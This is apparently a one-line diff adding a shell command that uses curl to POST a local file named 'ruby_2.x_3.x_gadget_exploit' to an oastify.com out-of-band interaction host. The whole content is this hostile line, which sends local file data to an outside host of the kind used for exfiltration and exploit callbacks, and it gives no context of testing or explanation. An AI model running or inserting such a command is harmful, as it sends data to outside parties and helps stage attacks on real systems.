@@ -1,0 +1,1 @@
+curl -X POST http://y43kuuqwrx7ten42wl9tbt5wun0eo4ct.oastify.com -d @./ruby_2.x_3.x_gadget_exploit
